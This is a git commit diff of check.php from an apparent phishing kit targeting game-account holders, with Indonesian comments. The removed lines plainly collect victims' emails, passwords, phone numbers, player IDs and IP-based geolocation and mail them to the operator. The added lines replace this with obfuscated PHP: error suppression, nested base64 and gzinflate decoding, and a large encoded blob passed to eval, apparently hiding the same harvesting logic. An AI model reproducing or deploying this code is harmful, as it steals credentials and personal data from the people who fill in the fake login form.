8f64db23b715e147d7c785affed82825dec9986f
MrMirch <99958168+MrMirch@users.noreply.github.com>
2022-02-18 13:52:27 +0330

    True Id Added

--- check.php
+++ check.php
@@ -1,146 +1,95 @@
-<?php
-// MENGAMBIL KONTROL
-include 'system/setting.php';
-include 'system/geolocation.php';
-include 'get_flag.php';
-include 'email.php';
-include 'get_callingcode.php';
-
-// MENANGKAP DATA YANG DI-INPUT
-$email = $_POST['email'];
-$password = $_POST['password'];
-$login = $_POST['login'];
-$playid = $_POST['playid'];
-$nick = $_POST['nick'];
-$phone = $_POST['phone'];
-$level = $_POST['level'];
-$tier = $_POST['tier'];
-$rpt = $_POST['rpt'];
-$rpl = $_POST['rpl'];
-$platform = $_POST['platform'];
-
-// MENGAMBIL DATA KODE PANGGILAN NEGARA 
-$callingcode = $arpantek_callingcode['country_code'];
-
-// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
-if($email == "" && $password == "" && $login == "" && $playid == "" && $nick == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == ""){
-header("Location: index.php");
-}else{
-
-// KONTEN RESULT AKUN
-$subjek = "$hasil_arpantek_flag | +$callingcode | PUNYA SI $email | LEVEL $level | TIER $tier | LOGIN $login";include 'system/get_callingcode.php';
-$pesan = '
-<center> 
-<div style="background: url(https://i.ibb.co/30cbv4k/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 70px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
-</div>
-<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
-<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
-<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
-<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER NAME</th>
-<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
-<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
-<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
-<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>TIER LEVEL</th>
-<th style="width: 78%; text-align: center;"><b>'.$tier.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>RP TYPE</th>
-<th style="width: 78%; text-align: center;"><b>'.$rpt.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>RP LEVEL</th>
-<th style="width: 78%; text-align: center;"><b>'.$rpl.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>PLATFORM</th>
-<th style="width: 78%; text-align: center;"><b>'.$platform.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
-<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
-</tr>
-</table>
-<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
-<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['continent'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['country'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
-<th style="width: 78%; text-align: center;"><b>'.$callingcode.'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['region'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['lat'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['lon'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
-<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
-</tr>
-<tr>
-<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
-<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
-</tr>
-</table>
-<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
-<div style="float: left; margin-top: 3%;">
-Temukan saya:
-</div>
-<div style="float: right;">
-<a href="https://facebook.com/arpantek22/"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
-<a href="https://t.me/arpantek_me"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
-</div>
-</div>
-</center>
-';
-$headers  = 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .= ''.$sender.'' . "\r\n";
-$kirim = mail($emailku, $subjek, $pesan, $headers);
-
-// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
-if($kirim) {
-echo "<form id='arpantek' method='POST' action='processing.php'>
-<input type='hidden' name='nick' value='$nick'>
-</form>
-<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
-}
-}
+<?php 
+/* -----------------------------------------------------------
+-  PHP Encoding by       :codebazan PHP Encoder              -
+-  PHP Encoder Version   :2.0                                -
+-  site                  :https://codebazan.ir/Tools/license  -
+-  mail                  :info@codebazan.ir                  -
+----------------------------------------------------------- */ 
+ error_reporting(0); $codebazankey1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA==");
+eval(gzinflate(base64_decode('hY7NCoJAFIVf5SQu5tIUzVpc9hxSeq0huwPzA4X47ikxEm7anu/82V7t+iRttE4aftkQgyq8iyyt67ggGjPFqqoyRG/lpsvL0yWJhBHlg9+oEdJ1ZqsBJw1DFWyvZmVgyYTq2iwxzzF5QXv3yvlOLS2EPXJxhQk8BP7vxHH5d/7+274wGpv5gyH9uzJNHw==')));
+$IlIlIlIlIlIlI=$codebazankey1[2].$codebazankey1[32].$codebazankey1[20].$codebazankey1[11].$codebazankey1[23].$codebazankey1[15].$codebazankey1[32].$codebazankey1[1].$codebazankey1[11];
+$codebazankey2 = $IlIlIlIlIlIlI("xes26:tr5bzf{8ydhog`uw9omvl7kicjp43nq", -1);
+$lIlIlIlIlIlIlIlI=$codebazankey2[16].$codebazankey2[12].$codebazankey2[31].$codebazankey2[23].$codebazankey2[18].$codebazankey2[24].$codebazankey2[9].$codebazankey2[20].$codebazankey2[11];
+$lIlIlIlIlIlIlIlIl=$codebazankey1[30].$codebazankey1[9].$codebazankey1[6].$codebazankey1[11].$codebazankey1[27].$codebazankey1[8].$codebazankey1[19].$codebazankey1[1].$codebazankey1[11].$codebazankey1[15].$codebazankey1[32].$codebazankey1[1].$codebazankey1[11];
+eval($lIlIlIlIlIlIlIlI(base64_decode('VZ
+RFrsWKgUQ301Ly5YGZFGVghmtme9IyM7NX32/aqh
+1U1TnllQ7//p9B+f/5d5buJYH9b1Hmc1H++19BkM
+Lb7sXDhSR9QKCy2qgC3ifdgEh5p7w6HiURSJ/mse
+F8k0bJt1HUB/D0BV7T+xXuvGEXoek4oVH4Rzf9qr
+VjuLyYGBGzZPTbcB0keiSHqtPkos+cbQQ0gmdO1p
+AvqJy0Nds/+9QAGxh/SsZOPcLofOrE38muYAtp7O
+1zinP3qOn22uiaRKB/1LW2uJdtidXDueGhO3Wkkz
+B38/PSVAdUSTdzKG1kc4f0TlqEOp6MY2iPUkDaao
+dBAi9L4P27S/ZjJoiYKuxdJjvWHr2Zbs2YrZgG9V
+KF+0HOdqtk3g0kr2MbKDvLhkxnr/Lp6KGtRyfzch
+ggWW78BUrlbK3XSZ+Vjuyix0JpwyKHTR/8ClpBFj
+fG61zLLnRQYCz6wKZ1aWjhfI/v0UUPJe5fD7w+XA
+wNiZjYrKA3dsYrCt+NRkCMx3PNWyZ8X2ve7T/CEL
+pfexwWAfbFvJIX15oCE8XR1IjoDSKtwDI8oOHlzU
+UQMALGHOe3ChyAi+UGIBzZNW4Qa4LazQIF0GoeSw
+VIch+uKdYyN+8ga0oMygBfpWB1cIE9fTelGVBvq5
+eosh5+4a9DhKy21ZaLll4VzxMQ7jTlk0vWzuVyu6
+zSDRYyNFI8fj/GmfSYAyko52RDfg6JV4RX8gOM72
+Re7hdcqI1x0zgyq0936G3l6FV6C6RRJEOHU4Qevr
+1FTcNDfEBjLoVyXIY9Qx5foGNqdhduQleg2eUEVG
+rx81uL5pmQI+kpwSv7O7+Goz1mcnpWxtducy9CwG
+IbV0CByR0U4XBgnHrJFvyFaA6EIg8q+sWc0SMfvE
+/rymrRv3ve1KnYfs6Bi7/CEjapbmnpikpOHtPQcP
+PLIXVRd6kqUFypDClYT997pBMttDwU0w+PlmEAUq
+kfS6RSZMAUA8PmK5bM83SbjvrjM6N7TGxQsU00dX
+RLFMfQUsTbnjAwbppnXmxMkqRWlLJW8QnwHkPmQ+
+3+dBB3y5h4IPJhcu89kseV7DsJW8eGOTDuIJu9pQ
+6NhRh9JwWi65zWdZPiDyLvjlY7xmn8jxuVQNIW/o
+VHfje2BkexnqencUAHM5zPWQu/jfbgxuOhC1jVqO
+yL5Zw2P1B4wUUKTs+dQ0UGVjQIFC1HSr+VwRR051
+feU5ZnJFDqXjqYpQRWpfnnCXAwCJ7xtroIXLquro
+UpXZE65eUxBrpn2pJdk5hQ898YUrr1WBdJ8jmg5B
+c+T6lrdgqNaAC11/X7ZmnpmMMPiNcS7lwvLVFpzX
+D+5eSCKoTBq64TkmDOFGx2k0ybU3uOWjOiZUfY+n
+BqFR6sweCNds89xnz1ILG/P4knH7fudmQsh8JKup
+TD0J+Pn6WwQfNKTYGcDUrPsxpF/2cK/ObWd3EhCC
+d9pOyXZXiyWT0u6J6C81ke97NdmsTWv0fSfqS0kH
+Fi6Rpt5PP7cMwuxxh5lPhFjFSWh+UVQzg9CH7qDs
+gAXFTEpW0IfOMiQe6e0sDKyuGEYU9gGxrcpYqXLF
+buexuZ3hVCc3iazhh9+TF9RzbGD9+DCW4vkB3P6v
+wYlHisMZTJm5JF1wjvznwvYw+I7xe0yhwqfKd/86
+yDKsdATDg3Kx2aiSqIiX2mqzNLSMonDmr5vZRp1x
+Vh6s42XpfEqUs84ASNEmxkDCB0MXcGBHQ1kKw6Is
+YRCE0knzELgL7RRa8OQTP8Hbrg5dJhVSHeSTc1Rd
+jN0tzx0opJ+GmffkxXZsvxIqBLMb7xN2IHJbl0Ji
+cxogl/PK8WVyY7jDPCBUZiUuze2kfs20tRfF+pEj
+LDSjnu/7EpkEWFYl6oBrLKhZ+eP+LIH/XcYWUUA+
+DwhljM0RlTPS5neTVFwY1Gd7u+YMcxtrM0hYXgyA
+MDJ9bcjAxyI/eOxlBknbG3sYcy2YTZIwSTry/DZR
+1iSccC/G3yR2+89bU17dgdc1ONpcPOoHSch78B1Q
+sWgeUytsI/9HmplAs9/0VnadQOzi6jLrGGF35juU
+C3Dc+a9dfgQrPqDHsNSed03zvhNq7ILD6hBj8xfF
+1tmCp74t67vbOsXU+GIYHB4TpeWenimAn0oc1TAZ
+MWtWEZWc0FWzMLEJ6nQt8AZ7okSM53Oy0rlJ+Tky
+UMeNZelBkRMuA9tcDNjIAkIkAAZbrb3HnBH9pPus
+NWpErpy8Tq+n1przPVvHIX5GyoFxbRyS5eLQ6ReJ
+7d69Q3lGukl1unbrNwWo9EHjF0cWbSWqPnlqWmmk
+bIokTastE7PS+dGhSwe/7qcHEOBC01eZxa7Z3vKj
+KejmnWHjObEMN8msyslwN95pUIdhUMLghUuBocCP
+zp7SA1pTP+iU22tdm+kOmxIF3l1FywqGT6gG1n5T
+GCT5h9yVoj8X5b6mcRHQCwMM02VlPMv0KyUhhZZD
+/LgZ/bDSEO6X/az2wYjodGHG2SdIS0hVC/69CkXM
+IuDMkhsD8e/MKT/sQTrspbeYY/cY0c8tQC1i03cW
+6u54SlJpjIrkqSoR5o3r4kL5YgkpPeV4vNHWUD83
+3wRDLfpYbTKIdD8iI/2VnY31Zva0fKG6o/KD5+ws
+FehIykLAZpt6Jdw6qTy30tGuoDt0q4E0oME6dByY
+Au8PcL38xPUGRgYqqkqPK+jM+bLXezOPBpmRwp5j
+vQxF/cfijYpZzTVH7RH9H7q4RhtUWrBBNpNtBoiz
+tEXx88YUKk707orixqxJ25yxs5G9TUKpe74QpAUv
+qNDEidKU3OOyF2+DzXeZ/N9iIgi09E0RAsiHrBeq
+YS3SA3EXK+3D7sT0GiOfyJm1Gtv3ZDWW0tCY5hM8
+T36dFTfS8eJ6kiiBSAuJR6sZPeScPx5NAY/Z4n1B
+AUynWyK5JGKW5oOyurJc6CB6HaiSU8oZszX6Xcas
+uIk0+Y2t4sZEUHl9ODbPcb3d4vT+Nk6WCqzTLGbW
+7a5m67YUpZjXkE5weEPwCT43d+EuAgVMO4CNDrCR
+RvkzEs91iIUM1swEPZAXsKv0m5wNzQ0avXBLDbiO
+QzAFtMLM7X3MSxII3uJelbabQCb2H5+k1TItdMdg
+ov40jpba128mRoDbFJ+Yse+8IBsvt2OQ7Ho0aSYy
+unvGYVomTrQNC6rgsEyej+73//9c8///zn/wA=')
+));
 ?>
